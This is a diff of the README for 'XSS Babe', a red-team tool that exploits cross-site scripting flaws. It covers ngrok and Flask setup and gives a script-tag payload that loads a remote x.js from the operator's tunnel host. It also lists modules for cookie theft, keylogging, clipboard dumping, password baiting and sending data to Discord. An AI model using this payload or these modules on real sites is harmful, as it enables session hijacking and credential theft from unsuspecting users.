@@ -1,35 +1,41 @@
-# XSS BABE 
+# XSS BABE
 
-XSS Babe is a red team tool for exploiting XSS vulnerabilities in real time. It automates delivery, tracking, and payload interaction through a live command-line interface. Built for ethical hacking, phishing research, and security training.
+XSS Babe is a red team tool for exploiting XSS vulnerabilities in real time. It automates payload delivery, logs sessions, and enables live browser-based attacks from a command-line interface. Built for ethical hacking, phishing research, and security education.
+
+---
 
 ## ⚠️ Legal Disclaimer
 
-This tool is for educational and ethical penetration testing only. Do not use it against targets without permission. You are solely responsible for how you use this software.
+Never use this tool without proper consent. 
+ 
+User assumes all risks when using this tool.
 
----
+ekomsSavior provides this tool without warranty. 
+ 
+ ---
 
 ##  File Structure
 
 ```
 xss_babe/
-├── xss_babe_cli.py             # Main interactive CLI
-├── server.py                   # Flask server for payload delivery
+├── xss_babe_cli.py             # Main interactive CLI launcher
+├── server.py                   # Flask backend serving modules and payloads
 ├── requirements.txt            # Python dependencies
 ├── static/
-│   ├── x.js                    # XSS loader script
-│   └── modules/
-│       ├── keylogger.js
-│       ├── fake_login.js
-│       ├── clipboard.js
+│   ├── x.js                    # Main XSS loader script
+│   └── modules/                # Individual attack modules
 │       ├── auto_cookie_steal.js
-│       ├── browser_history.js
-│       ├── download_bait.js
-│       ├── fingerprint.js
-│       ├── screenshot.js
-│       ├── recon.js
-│       └── cross_tab_spy.js
-└── sessions/
-    └── [timestamp].txt         # Auto-generated session logs
+│       ├── clipboard.js
+│       ├── cross_tab_messaging_spy.js
+│       ├── discord_logger.js
+│       ├── fake_download.js
+│       ├── history_stealer.js
+│       ├── keylogger.js
+│       └── password_bait.js
+├── utils/
+│   └── save_to_txt.py          # Optional utilities for saving session data
+└── session_reports/
+    └── example_report          # Placeholder file to preserve folder
 ```
 
 ---
@@ -56,9 +62,9 @@ sudo mv ngrok /usr/local/bin/
 
 ##  Ngrok Setup
 
-1. Sign up at https://ngrok.com/signup  
+1. Sign up: https://ngrok.com/signup  
 2. Get your auth token: https://dashboard.ngrok.com/get-started/setup  
-3. Add token:
+3. Add it to your config:
 
 ```bash
 ngrok config add-authtoken YOUR_TOKEN_HERE
@@ -72,58 +78,63 @@ ngrok config add-authtoken YOUR_TOKEN_HERE
 python3 xss_babe_cli.py
 ```
 
-### What It Does:
-- Prompts for a target XSS URL (like: `https://vuln.site/?q=`)
-- Auto-launches the Flask server and Ngrok
-- Injects `x.js` loader into your payload
-- Displays a live menu of attack modules
-- Logs all browser events and saves session results in `sessions/`
+### What Happens:
+
+- You enter a vulnerable XSS URL (e.g. `https://vuln.site/?q=`)
+- Flask server and Ngrok auto-launch
+- Payload is generated with the hosted `x.js`
+- CLI menu opens with live attack modules
+- All session info is logged to `session_reports/`
 
 ---
 
 ##  Example Payload
 
-Use the Ngrok URL + this payload:
+Replace `YOUR_NGROK_URL` with the tunnel shown in the CLI:
 
 ```html
 <script src="https://YOUR_NGROK_URL/static/x.js"></script>
 ```
 
----
-
-##  Modules List
-
-| Module            | Description                                      |
-|-------------------|--------------------------------------------------|
-| keylogger         | Records keystrokes in real time                  |
-| fake_login        | Displays fake login form for credential capture  |
-| clipboard         | Dumps contents of the victim’s clipboard         |
-| auto_cookie_steal | Extracts document cookies silently               |
-| browser_history   | Reads browser history if accessible              |
-| download_bait     | Triggers fake file downloads (ZIP/PDF/etc)       |
-| fingerprint       | Collects user-agent, screen size, timezone       |
-| screenshot        | Captures visual screenshot using HTML2Canvas     |
-| recon             | Loads iframe ports and resources for open recon  |
-| cross_tab_spy     | Detects and tracks multiple open tabs            |
+Paste this into any vulnerable parameter, form, or field you control.
 
 ---
 
-##  Logs and Reporting
+##  Attack Modules
 
-All session output (payloads used, timestamps, logs) are saved to:
+| Module                   | Description                                         |
+|--------------------------|-----------------------------------------------------|
+| keylogger                | Records keystrokes live from the victim             |
+| clipboard                | Dumps clipboard contents                            |
+| auto_cookie_steal        | Steals document cookies silently                    |
+| discord_logger           | Sends logs to Discord webhook (edit inside script)  |
+| fake_download            | Triggers fake file downloads (ZIP, PDF, etc.)       |
+| password_bait            | Displays bait input field to trap saved passwords   |
+| history_stealer          | Dumps limited browsing history if accessible        |
+| cross_tab_messaging_spy  | Tracks multiple browser tabs or windows             |
+
+---
+
+##  Session Logs
+
+All payloads and events are saved to:
 
 ```
-sessions/YYYY-MM-DD-HHMMSS.txt
+session_reports/YYYY-MM-DD-HHMMSS.txt
 ```
 
+This includes:
+- Target URL
+- Payload used
+- Ngrok tunnel
+- Timestamp
+
 ---
 
-##  Stay Ethical
+## Stay Ethical
 
-Use XSS Babe only in lab environments or on targets you own or have permission to test. 
+Never deploy on unauthorized systems.
 
 ---
 
-##  Author
-
-Developed by [ekomsSavior](https://github.com/ekomsSavior)
+##  Author by [ekomsSavior](https://github.com/ekomsSavior) 🖤
